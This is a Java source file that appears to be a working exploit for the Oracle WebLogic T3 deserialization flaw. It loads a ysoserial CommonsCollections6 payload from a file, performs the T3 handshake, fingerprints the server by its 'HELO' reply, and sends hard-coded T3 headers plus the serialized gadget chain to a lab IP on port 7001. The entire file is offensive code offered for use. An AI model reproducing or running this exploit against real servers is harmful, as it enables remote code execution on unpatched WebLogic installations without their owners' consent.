package org.exploit.third.Weblogic;

import java.io.*;
import java.net.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.regex.*;
import java.nio.charset.StandardCharsets;

public class WebLogicExploit {

    // Function to generate payload using ysoserial
    public static byte[] generatePayload() throws IOException {
        String filePath = "cc6.ser";

        byte[] payload = new byte[0];
        try {
            // 读取二进制文件
            payload = Files.readAllBytes(Paths.get(filePath));

        } catch (IOException e) {
            e.printStackTrace();
        }
        return payload;
    }

    // Function to send the exploit payload over T3 protocol
    public static void T3Exploit(String ip, int port, byte[] payload) throws IOException {
        Socket socket = new Socket(ip, port);
        OutputStream outputStream = socket.getOutputStream();
        InputStream inputStream = socket.getInputStream();
        
        // Send T3 handshake
        String handshake = "t3 10.3.6\nAS:255\nHL:19\nMS:10000000\n\n";
        outputStream.write(handshake.getBytes(StandardCharsets.UTF_8));
        outputStream.flush();
        
        // Read response from the server
        byte[] response = new byte[1024];
        int len = inputStream.read(response);
        String responseData = new String(response, 0, len, StandardCharsets.UTF_8);

        // Check if it's WebLogic server
        Pattern pattern = Pattern.compile("HELO");
        Matcher matcher = pattern.matcher(responseData);
        if (matcher.find()) {
            System.out.println("WebLogic");
        } else {
            System.out.println("Not WebLogic");
            socket.close();
            return;
        }
        
        // Construct the full payload with headers and exploit data
        byte[] header = hexStringToByteArray("00000000");
        byte[] t3Header = hexStringToByteArray("016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006");
        byte[] desFlag = hexStringToByteArray("fe010000");

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(t3Header);
        byteArrayOutputStream.write(desFlag);
        byteArrayOutputStream.write(payload);

        byte[] fullPayload = byteArrayOutputStream.toByteArray();

        // Set the length in the correct place
        byte[] lengthPrefix = new byte[4];
        for (int i = 0; i < 4; i++) {
            lengthPrefix[i] = (byte) ((fullPayload.length >> (8 * (3 - i))) & 0xFF);
        }
        
        // Send the payload
        outputStream.write(lengthPrefix);
        outputStream.write(fullPayload, 4, fullPayload.length - 4);
        outputStream.flush();
        
        socket.close();
    }

    // Helper function to convert hex string to byte array
    private static byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                                + Character.digit(s.charAt(i + 1), 16));
        }
        return data;
    }

    public static void main(String[] args) {
        String ip = "192.168.152.128";
        int port = 7001;

        try {
            // Generate the payload
            byte[] payload = generatePayload();
            
            // Exploit WebLogic server
            T3Exploit(ip, port, payload);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}